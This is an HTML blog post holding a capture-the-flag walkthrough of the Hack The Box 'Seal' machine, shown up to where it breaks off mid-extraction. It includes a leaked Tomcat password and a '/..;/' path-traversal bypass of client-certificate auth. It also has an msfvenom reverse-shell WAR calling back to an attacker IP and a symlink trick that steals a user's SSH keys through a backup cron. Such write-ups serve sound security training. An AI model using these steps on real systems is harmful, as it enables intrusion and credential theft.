@@ -1,0 +1,589 @@
+<!doctype html><html lang=en>
+<head>
+<meta charset=utf-8>
+<meta http-equiv=x-ua-compatible content="ie=edge">
+<meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no">
+<meta name=author content="[map[name:MindYourPrivacy]]">
+<meta name=description content="Short description of your site here">
+<meta name=keywords content=",untagged">
+<meta name=robots content="noodp">
+<meta name=theme-color content>
+<link rel=canonical href=https://0xade1.github.io/posts/2021/10/htb-seal/>
+<title>
+Htb Seal :: Poney Island — Welcome to Pwnie Island
+</title>
+<link href=https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css rel=stylesheet type=text/css>
+<link rel=stylesheet href=https://0xade1.github.io/main.d5b952c3b0131e8ecd6d80f97c5fae89d216a2c29dfa0754010b808bdb098871.css>
+<link rel=apple-touch-icon sizes=180x180 href=https://0xade1.github.io/apple-touch-icon.png>
+<link rel=icon type=image/png sizes=32x32 href=https://0xade1.github.io/favicon-32x32.png>
+<link rel=icon type=image/png sizes=16x16 href=https://0xade1.github.io/favicon-16x16.png>
+<link rel=manifest href=https://0xade1.github.io/site.webmanifest>
+<link rel=mask-icon href=https://0xade1.github.io/safari-pinned-tab.svg color=#1b1c1d>
+<link rel="shortcut icon" href=https://0xade1.github.io/favicon.ico>
+<meta name=msapplication-TileColor content="#1b1c1d">
+<meta name=theme-color content="#1b1c1d">
+<meta itemprop=name content="Htb Seal">
+<meta itemprop=description content="Short description of your site here"><meta itemprop=datePublished content="2021-10-24T20:06:41+08:00">
+<meta itemprop=dateModified content="2021-10-24T20:06:41+08:00">
+<meta itemprop=wordCount content="1430"><meta itemprop=image content="https://0xade1.github.io">
+<meta itemprop=keywords content="untagged,">
+<meta name=twitter:card content="summary_large_image">
+<meta name=twitter:image content="https://0xade1.github.io">
+<meta name=twitter:title content="Htb Seal">
+<meta name=twitter:description content="Short description of your site here">
+<meta property="og:title" content="Htb Seal">
+<meta property="og:description" content="Short description of your site here">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://0xade1.github.io/posts/2021/10/htb-seal/"><meta property="og:image" content="https://0xade1.github.io"><meta property="article:section" content="posts">
+<meta property="article:published_time" content="2021-10-24T20:06:41+08:00">
+<meta property="article:modified_time" content="2021-10-24T20:06:41+08:00">
+<meta property="article:published_time" content="2021-10-24 20:06:41 +0800 +0800">
+</head>
+<body>
+<div class=container>
+<header class=header>
+<span class=header__inner>
+<a href=https://0xade1.github.io/ style=text-decoration:none>
+<div class=logo>
+<span class=logo__mark>></span>
+<span class=logo__text># cd /root/</span>
+<span class=logo__cursor>
+</span>
+</div>
+</a>
+<span class=header__right>
+<nav class=menu>
+<ul class=menu__inner><li><a href=https://0xade1.github.io/about/>About</a></li><li><a href=https://0xade1.github.io/categories/>Categories</a></li><li><a href=https://0xade1.github.io/posts/>Posts</a></li><li><a href=https://0xade1.github.io/series/>Series</a></li><li><a href=https://0xade1.github.io/tags/>Tags</a></li>
+</ul>
+</nav>
+<span class=menu-trigger><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M0 0h24v24H0z" fill="none"/><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg>
+</span>
+</span>
+</span>
+</header>
+<div class=content>
+<main class=post>
+<div class=post-info><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" ecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"/><line x1="16" y1="2" x2="16" y2="6"/><line x1="8" y1="2" x2="8" y2="6"/><line x1="3" y1="10" x2="21" y2="10"/></svg>
+2021-10-24
+|
+</div>
+<article>
+<h1 class=post-title>
+<a href=https://0xade1.github.io/posts/2021/10/htb-seal/>Htb Seal</a>
+</h1>
+<div class=post-info>
+<p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 01-2.83.0L2 12V2h10l8.59 8.59a2 2 0 010 2.82z"/><line x1="7" y1="7" x2="7" y2="7"/></svg>
+<span class=tag><a href=https://0xade1.github.io/tags/untagged/>untagged</a></span>
+</p>
+</div>
+<div class=post-excerpt>Short description of your site here</div>
+<div class=post-content>
+<h2 id=heading></h2>
+<pre><code>rustscan -a 10.10.10.250 -t 2000  -- -Pn -A -sCV
+Open 10.10.10.250:22
+Open 10.10.10.250:443
+Open 10.10.10.250:8080
+
+PORT     STATE SERVICE    REASON  VERSION
+22/tcp   open  ssh        syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
+443/tcp  open  ssl/http   syn-ack nginx 1.18.0 (Ubuntu)
+| http-methods:
+|_  Supported Methods: OPTIONS GET HEAD POST
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+|_http-title: Seal Market
+| ssl-cert: Subject: commonName=seal.htb/organizationName=Seal Pvt Ltd/stateOrProvinceName=London/countryName=UK/emailAddress=admin@seal.htb/organizationalUnitName=Infra/localityName=Hackney
+| Issuer: commonName=seal.htb/organizationName=Seal Pvt Ltd/stateOrProvinceName=London/countryName=UK/emailAddress=admin@seal.htb/organizationalUnitName=Infra/localityName=hackney
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2021-05-05T10:24:03
+| Not valid after:  2022-05-05T10:24:03
+| MD5:   9c4f 991a bb97 192c df5a c513 057d 4d21
+| SHA-1: 0de4 6873 0ab7 3f90 c317 0f7b 872f 155b 305e 54ef
+| -----BEGIN CERTIFICATE-----
+| MIIDiDCCAnACAWQwDQYJKoZIhvcNAQELBQAwgYkxCzAJBgNVBAYTAlVLMQ8wDQYD
+| VQQIDAZMb25kb24xEDAOBgNVBAcMB2hhY2tuZXkxFTATBgNVBAoMDFNlYWwgUHZ0
+| IEx0ZDEOMAwGA1UECwwFSW5mcmExETAPBgNVBAMMCHNlYWwuaHRiMR0wGwYJKoZI
+| hvcNAQkBFg5hZG1pbkBzZWFsLmh0YjAeFw0yMTA1MDUxMDI0MDNaFw0yMjA1MDUx
+| MDI0MDNaMIGJMQswCQYDVQQGEwJVSzEPMA0GA1UECAwGTG9uZG9uMRAwDgYDVQQH
+| DAdIYWNrbmV5MRUwEwYDVQQKDAxTZWFsIFB2dCBMdGQxDjAMBgNVBAsMBUluZnJh
+| MREwDwYDVQQDDAhzZWFsLmh0YjEdMBsGCSqGSIb3DQEJARYOYWRtaW5Ac2VhbC5o
+| dGIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDafbynnscdjWeuXTrD
+| M36rTJ0y2pJpDDFe9ngryz/xw1KsoPfEDrDE0XHc8LVlD9cxXd/8+0feeV34d63s
+| YyZ0t5tHlAKw1h9TEa/og1yR1MyxZRf+K/wcX+OwXYFtMHkXCZFH7TPXLKtCrMJM
+| Z6GCt3f1ccrI10D+/dMo7eyQJsat/1e+6PgrTWRxImcjOCDOZ1+mlfSkvmr5TUBW
+| SU3uil2Qo5Kj9YLCPisjKpVuyhHU6zZ5KuBXkudaPS0LuWQW1LTMyJzlRfoIi9J7
+| E2uUQglrTKKyd3g4BhWUABbwyxoj2WBbgvVIdCGmg6l8JPRZXwdLaPZ/FbHEQ47n
+| YpmtAgMBAAEwDQYJKoZIhvcNAQELBQADggEBAJZGFznhRSEa2DTgevXl1T8uxpiG
+| PPd9R0whiIv3s225ir9SWW3Hl1tVkEY75G4PJA/DxmBIHxIK1OU8kZMuJUevnSIC
+| rK16b9Y5Y1JEnaQwfKCoQILMU40ED76ZIJigGqAoniGCim/mwR1F1r1g63oUttDT
+| aGLrpvN6XVkqSszpxTMMHk3SqwNaKzsaPKWPGuEbj9GGntRo1ysqZfBttgUMFIzl
+| 7un7bBMIn+SPFosNGBmXIU9eyR7zG+TmpGYvTgsw0ZJqZL9yQIcszJQZPV3HuLJ8
+| 8srMeWYlzSS1SOWrohny4ov8jpMjWkbdnDNGRMXIUpapho1R82hyP7WEfwc=
+|_-----END CERTIFICATE-----
+| tls-alpn:
+|_  http/1.1
+| tls-nextprotoneg:
+|_  http/1.1
+8080/tcp open  http-proxy syn-ack
+| fingerprint-strings:
+[..]
+|   HTTPOptions:
+|     HTTP/1.1 200 OK
+|     Date: Sun, 24 Oct 2021 12:03:05 GMT
+|     Set-Cookie: JSESSIONID=node010k76pfhwfwkxjadymh9z3z9a1.node0; Path=/; HttpOnly
+|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
+|     Content-Type: text/html;charset=utf-8
+|     Allow: GET,HEAD,POST,OPTIONS
+|     Content-Length: 0
+</code></pre>
+<h2 id=http-tcp8080---gibucket-website-and-tcp443-seal-market>http TCP/8080 - GiBucket website and TCP/443 Seal Market</h2>
+<p>On port 443 a tomcat is running a website <strong>seal market</strong>:</p>
+<pre><code>gobuster dir -k -u https://seal.htb -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -t 30
+/css (Status: 302)
+/images (Status: 302)
+/admin (Status: 302)
+/js (Status: 302)
+/manager (Status: 302)
+/icon (Status: 302)
+</code></pre>
+<p>On port 8080, after registration of a new account, we access a gitbucket website which contains the Tomcat website source code of the seal market. The README has a nice ToDo list:</p>
+<pre><code>Remove mutual authentication for dashboard, setup registration and login features.
+Deploy updated tomcat configuration.
+Disable manager and host-manager.
+</code></pre>
+<p>However we were are being denied access (status_code 403) to the dashboard, and manager interface.</p>
+<p>on the <strong>infra</strong> repository, we find main.yml file with the Java and tomcat version but none have an exploit available.</p>
+<pre><code>- name: Install Java 1.8
+  yum: name=java-1.8.0-openjdk state=present
+  [..]
+- name: Download Tomcat
+  get_url: url=http://archive.apache.org/dist/tomcat/tomcat-8/v8.0.61/bin/apache-tomcat-8.0.61.tar.gz dest=/opt/apache-tomcat-8.0.61.tar.gz
+  [..]
+</code></pre>
+<p>Looking at nginx configuration <strong>sites-enabled/default</strong>, we can see the access to manager and dashboard interface is protected by certificate authentication:</p>
+<div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
+<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
+<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
+</span></code></pre></td>
+<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
+<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php>ssl_client_certificate <span style=color:#ff79c6>/</span><span style=color:#ff79c6>var</span><span style=color:#ff79c6>/</span>www<span style=color:#ff79c6>/</span>keys<span style=color:#ff79c6>/</span>selfsigned<span style=color:#ff79c6>-</span>ca<span style=color:#ff79c6>.</span>crt;
+
+server {
+[<span style=color:#ff79c6>..</span>]
+    location <span style=color:#ff79c6>/</span>manager<span style=color:#ff79c6>/</span>html {
+        <span style=color:#ff79c6>if</span> (<span style=color:#8be9fd;font-style:italic>$ssl_client_verify</span> <span style=color:#ff79c6>!=</span> SUCCESS) { <span style=color:#ff79c6>return</span> <span style=color:#bd93f9>403</span>; }
+        [<span style=color:#ff79c6>..</span>]
+        proxy_redirect      http<span style=color:#ff79c6>://</span>localhost<span style=color:#ff79c6>:</span><span style=color:#bd93f9>8000</span> https<span style=color:#ff79c6>://</span><span style=color:#bd93f9>0.0</span><span style=color:#ff79c6>.</span><span style=color:#bd93f9>0.0</span>;
+    }
+    location <span style=color:#ff79c6>/</span>admin<span style=color:#ff79c6>/</span>dashboard {
+        <span style=color:#ff79c6>if</span> (<span style=color:#8be9fd;font-style:italic>$ssl_client_verify</span> <span style=color:#ff79c6>!=</span> SUCCESS) { <span style=color:#ff79c6>return</span> <span style=color:#bd93f9>403</span>; }
+        [<span style=color:#ff79c6>..</span>]
+        proxy_redirect      http<span style=color:#ff79c6>://</span>localhost<span style=color:#ff79c6>:</span><span style=color:#bd93f9>8000</span> https<span style=color:#ff79c6>://</span><span style=color:#bd93f9>0.0</span><span style=color:#ff79c6>.</span><span style=color:#bd93f9>0.0</span>;
+    }
+    location <span style=color:#ff79c6>/</span>host<span style=color:#ff79c6>-</span>manager<span style=color:#ff79c6>/</span>html {
+        <span style=color:#ff79c6>if</span> (<span style=color:#8be9fd;font-style:italic>$ssl_client_verify</span> <span style=color:#ff79c6>!=</span> SUCCESS) { <span style=color:#ff79c6>return</span> <span style=color:#bd93f9>403</span>; }
+        [<span style=color:#ff79c6>..</span>]
+        proxy_redirect      http<span style=color:#ff79c6>://</span>localhost<span style=color:#ff79c6>:</span><span style=color:#bd93f9>8000</span> https<span style=color:#ff79c6>://</span><span style=color:#bd93f9>0.0</span><span style=color:#ff79c6>.</span><span style=color:#bd93f9>0.0</span>;
+    }
+}
+</code></pre></td></tr></table>
+</div>
+</div><p>I found this resource to explain me how client-certificate authentication works with nginx: <a href=https://jason.whitehorn.us/blog/2019/02/01/client-certificate-auth-with-nginx/>https://jason.whitehorn.us/blog/2019/02/01/client-certificate-auth-with-nginx/</a> .</p>
+<p>On tomcat/tomcat-users.xml we find the manager password removed by an older commit 971f3aa3f0a0cc8aac12fd696d9631ca540f44c7:</p>
+<div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
+<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
+<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
+<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=color:#ff79c6>&lt;user</span> <span style=color:#50fa7b>username=</span><span style=color:#f1fa8c>&#34;tomcat&#34;</span> <span style=color:#50fa7b>password=</span><span style=color:#f1fa8c>&#34;42MrHBf*z8{Z%&#34;</span> <span style=color:#50fa7b>roles=</span><span style=color:#f1fa8c>&#34;manager-gui,admin-gui&#34;</span><span style=color:#ff79c6>/&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Tomcat dashboard <strong>/manager/status</strong> does not appear to be protected with client-certificate authentication. Supplying above credentials is a Success. And we get a lot of useful information:</p>
+<table>
+<thead>
+<tr>
+<th>Tomcat Version</th>
+<th>JVM Version</th>
+<th>JVM Vendor</th>
+<th>OS Name</th>
+<th>OS Version</th>
+<th>OS Architecture</th>
+<th>Hostname</th>
+<th>IP Address</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Apache Tomcat/9.0.31 (Ubuntu)</td>
+<td>11.0.11+9-Ubuntu-0ubuntu2.20.04</td>
+<td>Ubuntu</td>
+<td>Linux</td>
+<td>5.4.0-80-generic</td>
+<td>amd64</td>
+<td>seal</td>
+<td>127.0.1.1</td>
+</tr>
+</tbody>
+</table>
+<p>I could not find a CVE, but this blog post describes a <a href=https://www.acunetix.com/vulnerabilities/web/tomcat-path-traversal-via-reverse-proxy-mapping/>tomcat path traversal vulenrability via reverse proxy</a>:</p>
+<blockquote>
+<p>When Apache Tomcat is used together with a reverse proxy such as nginx there is a nromalization inconsistency.
+Tomcat will threat the sequence /..;/ as /../ and normalize the path while reverse proxies will not normalize this sequence and send it to Apache Tomcat as it is.</p>
+</blockquote>
+<p>And indeed, without the need of the client-certificate, I am able to access tomcat manager: <code>https://seal.htb/manager/status/..;/html</code>. From there I am able to deploy an evil WAR file with msfvenom.</p>
+<pre><code>msfvenom --list payloads | grep java | grep reverse
+msfvenom -p java/shell_reverse_tcp  --list-options
+msfvenom -p java/shell_reverse_tcp LHOST=10.10.14.44 LPORT=443 -f war -o /data/evil.war
+</code></pre>
+<p>I have to edit the form action field:</p>
+<div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
+<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
+<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">5
+</span></code></pre></td>
+<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
+<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html>&lt;<span style=color:#ff79c6>form</span>
+  <span style=color:#50fa7b>method</span><span style=color:#ff79c6>=</span><span style=color:#f1fa8c>&#34;post&#34;</span>
+  <span style=color:#50fa7b>action</span><span style=color:#ff79c6>=</span><span style=color:#f1fa8c>&#34;/manager/status/..;/html/upload?org.apache.catalina.filters.CSRF_NONCE=D1D43C74CF17A2E24CDC4E7099F68642&#34;</span>
+  <span style=color:#50fa7b>enctype</span><span style=color:#ff79c6>=</span><span style=color:#f1fa8c>&#34;multipart/form-data&#34;</span>
+&gt;&lt;/<span style=color:#ff79c6>form</span>&gt;
+</code></pre></td></tr></table>
+</div>
+</div><p>We start a netcat listener and we deploy the war in tomcat. Upon visit of <a href=https://seal.htb/evil/>https://seal.htb/evil/</a> we have reverse shell:</p>
+<pre><code>nc -lnvp 443
+Listening on 0.0.0.0 443
+Connection received on 172.19.0.1 65236
+id
+uid=997(tomcat) gid=997(tomcat) groups=997(tomcat)
+pwd
+/var/lib/tomcat9
+whereis python
+python: /usr/bin/python3.8 /usr/lib/python3.9 /usr/lib/python2.7 /usr/lib/python3.8 /etc/python3.8 /usr/local/lib/python3.8
+/usr/bin/python3.8 -c &quot;import pty; pty.spawn('/bin/bash')&quot;
+tomcat@seal:/var/lib/tomcat9$
+</code></pre>
+<p>We find user luis:</p>
+<pre><code>tomcat@seal:/var/lib/tomcat9$ cat /etc/passwd
+tomcat❌997:997:Apache Tomcat:/:/usr/sbin/nologin
+luis❌1000:1000:,,,:/home/luis:/bin/bash
+tomcat@seal:/var/lib/tomcat9$ ls -la /home/luis
+ls -la /home/luis
+total 51320
+drwxr-xr-x 9 luis luis     4096 May  7 07:01 .
+drwxr-xr-x 3 root root     4096 May  5 12:52 ..
+drwxrwxr-x 3 luis luis     4096 May  7 06:00 .ansible
+lrwxrwxrwx 1 luis luis        9 May  5 12:57 .bash_history -&gt; /dev/null
+-rw-r--r-- 1 luis luis      220 May  5 12:52 .bash_logout
+-rw-r--r-- 1 luis luis     3797 May  5 12:52 .bashrc
+drwxr-xr-x 3 luis luis     4096 May  7 07:00 .cache
+drwxrwxr-x 3 luis luis     4096 May  5 13:45 .config
+drwxrwxr-x 6 luis luis     4096 Oct 25 07:12 .gitbucket
+-rw-r--r-- 1 luis luis 52497951 Jan 14  2021 gitbucket.war
+drwxrwxr-x 3 luis luis     4096 May  5 13:41 .java
+drwxrwxr-x 3 luis luis     4096 May  5 14:33 .local
+-rw-r--r-- 1 luis luis      807 May  5 12:52 .profile
+drwx------ 2 luis luis     4096 May  7 06:10 .ssh
+-r-------- 1 luis luis       33 Oct 25 07:12 user.txt
+</code></pre>
+<p>We can download the client side certificate:</p>
+<pre><code>tomcat@seal:/var/lib/tomcat9/conf$  cat /var/www/keys/selfsigned-ca.crt
+ cat /var/www/keys/selfsigned-ca.crt
+-----BEGIN CERTIFICATE-----
+MIID9TCCAt2gAwIBAgIUBOB6OYUwe6jSIzw6c16KyacbuXcwDQYJKoZIhvcNAQEL
+BQAwgYkxCzAJBgNVBAYTAlVLMQ8wDQYDVQQIDAZMb25kb24xEDAOBgNVBAcMB2hh
+Y2tuZXkxFTATBgNVBAoMDFNlYWwgUHZ0IEx0ZDEOMAwGA1UECwwFSW5mcmExETAP
+BgNVBAMMCHNlYWwuaHRiMR0wGwYJKoZIhvcNAQkBFg5hZG1pbkBzZWFsLmh0YjAe
+Fw0yMTA1MDUxMDIyMTJaFw0zMTA1MDMxMDIyMTJaMIGJMQswCQYDVQQGEwJVSzEP
+MA0GA1UECAwGTG9uZG9uMRAwDgYDVQQHDAdoYWNrbmV5MRUwEwYDVQQKDAxTZWFs
+IFB2dCBMdGQxDjAMBgNVBAsMBUluZnJhMREwDwYDVQQDDAhzZWFsLmh0YjEdMBsG
+CSqGSIb3DQEJARYOYWRtaW5Ac2VhbC5odGIwggEiMA0GCSqGSIb3DQEBAQUAA4IB
+DwAwggEKAoIBAQC8U1tMadRl3C/5LgPfjvSlXJgvfu5UUyBG5XMnMeHE9L2Un1xa
+S31zCuHhvfMuIJzRNKIarpRtdBauZxe8/vGxu+xzi9KBfIYHE112va1OsokqqTUP
+qxRV36cqVpkKVUZiIeNbDFCxfY22WZO9vzBzXWrwjtvPiex0IHXU134xI06AkD3M
+aANB/YfEB2i4NOnrac49aj3gpTjA070WqdGo4kGx6odjsHrMHzi7vaR0JoOhDsw6
+HxR22tGaqlH39zQtC2EjxPkSVP2SofFDmxr/iYwIVdDH6Fie5XEWse+BNeQMU5Vk
+WTZ5LME0793j7YYdR20SYMaGgv3sP/ex4djXAgMBAAGjUzBRMB0GA1UdDgQWBBT6
+arSNOx5QDRjz0iqoE+edZZVCSzAfBgNVHSMEGDAWgBT6arSNOx5QDRjz0iqoE+ed
+ZZVCSzAPBgNVHRMBAf8EBTADAQH/MA0GCSqGSIb3DQEBCwUAA4IBAQAlZ3mMtdPH
+eIge5rKIko1ozfQc7ToiRm9y3cDkuMHpGmZkCCWEHpRpNkeZ9Zm91QLgyrM6vyPk
+MaKObG7YKqQOl4WTjvLEQAjnE7AZWGIdETOCD0yD7fja0AzSJrbnYHSN0hD763xA
+lOW5XK1kp4XKJgMg56Op1S8Lqz8teLH8Id/+AP51z9tQFnhsVXKP7nUb03qWwoEc
+alIK26/kNfafEi46C/3VPQ7YiY38lILo+OhI4nWVw1gIfrtxgcJl+UZJSHLCKa3m
+J6ZL+YFeqwpyND/Ywrfrmky+QLMZdkqAa16b+rtXNxQlwnSwD41hRF4IXz7qupD0
+UpzLgi5sAUnE
+-----END CERTIFICATE-----
+</code></pre>
+<p>Looking at interesting processes we find:</p>
+<pre><code>tomcat@seal:/var/lib/tomcat9/conf$ ps -aux --forest | grep luis
+luis        1120  0.0  0.0   2608   540 ?        Ss   07:11   0:00  |   \_ /bin/sh -c java -jar /home/luis/gitbucket.war
+luis        1122  0.7 10.0 3654680 406952 ?      Sl   07:11   2:16  |       \_ java -jar /home/luis/gitbucket.war
+root       56850  0.0  0.0   2608   604 ?        Ss   12:16   0:00      \_ /bin/sh -c sleep 30 &amp;&amp; sudo -u luis /usr/bin/ansible-playbook /opt/backups/playbook/run.yml
+</code></pre>
+<p>We can download the run.yml playbook, and we can see that it will copy everything from the tomcat dashboard directory, including symlinks (see row 6: <code>copy_links=yes</code>):</p>
+<div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
+<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
+<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
+</span></code></pre></td>
+<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
+<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-yaml data-lang=yaml>tomcat@seal:/var/lib/tomcat9/conf$ cat /opt/backups/playbook/run.yml
+cat /opt/backups/playbook/run.yml
+- <span style=color:#ff79c6>hosts</span>: localhost
+  <span style=color:#ff79c6>tasks</span>:
+  - <span style=color:#ff79c6>name</span>: Copy Files
+    <span style=color:#ff79c6>synchronize</span>: src=https://0xade1.github.io/var/lib/tomcat9/webapps/ROOT/admin/dashboard dest=/opt/backups/files copy_links=yes
+  - <span style=color:#ff79c6>name</span>: Server Backups
+    <span style=color:#ff79c6>archive</span>:
+      <span style=color:#ff79c6>path</span>: /opt/backups/files/
+      <span style=color:#ff79c6>dest</span>: <span style=color:#f1fa8c>&#34;/opt/backups/archives/backup-{{ansible_date_time.date}}-{{ansible_date_time.time}}.gz&#34;</span>
+  - <span style=color:#ff79c6>name</span>: Clean
+    <span style=color:#ff79c6>file</span>:
+      <span style=color:#ff79c6>state</span>: absent
+      <span style=color:#ff79c6>path</span>: /opt/backups/files/
+</code></pre></td></tr></table>
+</div>
+</div><p>We can try to copy user.txt and .ssh folder by creating a symlink in a writable folder. uploads folder is a good candidate:</p>
+<pre><code>tomcat@seal:/var/lib/tomcat9$ cd /var/lib/tomcat9/webapps/ROOT/admin/dashboard
+tomcat@seal:/var/lib/tomcat9/webapps/ROOT/admin/dashboard$ ls -la
+ls -la
+total 100
+drwxr-xr-x 7 root root  4096 May  7 09:26 .
+drwxr-xr-x 3 root root  4096 May  6 10:48 ..
+drwxr-xr-x 5 root root  4096 Mar  7  2015 bootstrap
+drwxr-xr-x 2 root root  4096 Mar  7  2015 css
+drwxr-xr-x 4 root root  4096 Mar  7  2015 images
+-rw-r--r-- 1 root root 71744 May  6 10:42 index.html
+drwxr-xr-x 4 root root  4096 Mar  7  2015 scripts
+drwxrwxrwx 2 root root  4096 May  7 09:26 upload
+tomcat@seal:/var/lib/tomcat9/webapps/ROOT/admin/dashboard$ cd uploads
+tomcat@seal:/var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads$ ln -s /home/luis/user.txt
+tomcat@seal:/var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads$ ln -s /home/luis/.ssh
+</code></pre>
+<p>Now we can explore the destination and wait for the cron job to execute. We got the .ssh but not the user flag.</p>
+<pre><code>tomcat@seal:/var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads$ cd /opt/backups
+tomcat@seal:/opt/backups$ date
+Mon 25 Oct 2021 12:39:12 PM UTC
+tomcat@seal:/opt/backups$ ls archives
+backup-2021-10-25-12:40:33.gz
+tomcat@seal:/opt/backups$ cp archives/backup-2021-10-25-12:40:33.gz /dev/shm
+tomcat@seal:/dev/shm$ gunzip backup-2021-10-25-12:40:33.gz
+tomcat@seal:/dev/shm$ file backup-2021-10-25-12:40:33
+backup-2021-10-25-12:40:33: POSIX tar archive
+tomcat@seal:/dev/shm$ tar xvf 'backup-2021-10-25-12:40:33'
+tomcat@seal:/dev/shm$ mv backup* backup
+tomcat@seal:/dev/shm$ tar xvf backup
